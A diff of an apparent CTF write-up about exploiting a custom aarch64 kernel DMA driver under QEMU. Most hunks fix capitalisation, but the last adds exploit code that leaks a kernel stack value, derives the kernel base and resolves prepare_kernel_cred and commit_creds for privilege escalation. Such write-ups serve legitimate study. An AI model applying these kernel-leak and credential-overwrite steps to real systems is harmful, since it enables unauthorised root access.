@@ -16,7 +16,7 @@ tags: [kernel, aarch64, qemu]
     our product that we are releasing everything a bounty hunter might need for a 
     successful audit.
 
-we are given a tarball with a compiled `qemu-system-aarch64`, an initrd, some
+We are given a tarball with a compiled `qemu-system-aarch64`, an initrd, some
 scripts, and a patch and C file. A quick glance at the C file reveals that it is
 a kernel driver.
 
@@ -62,7 +62,7 @@ ctrl is taken from the user, but it is unconditionally set on line 164:
     items[i].ctrl = PL666_LLI_MORE;
 ```
 
-Ultimately, the lli buffer will be handed directly to the DMA engine, and the
+Ultimately, the LLI buffer will be handed directly to the DMA engine, and the
 `LLI_MORE` flag indicates that there are more entries in the LLI array. The final
 entry gets the `LLI_MORE` flag unset on line 176:
 ```c
@@ -256,6 +256,9 @@ besides me.
 
 Resolve the needed kernel functions:
 ```c
+    uint64_t * kstack_leak = read_kernel(secfd, 0xffff800010003758, 16);
+    printf("##\t%p:%p (%p)\n",0xffff800010003758, kstack_leak[0], kstack_leak[0] - 0x8b8d38);
+    uint64_t kernel_base         = kstack_leak[0] - 0x8b8d38;
     uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
     uint64_t commit_creds        = kernel_base + 0x693e0;
     uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;
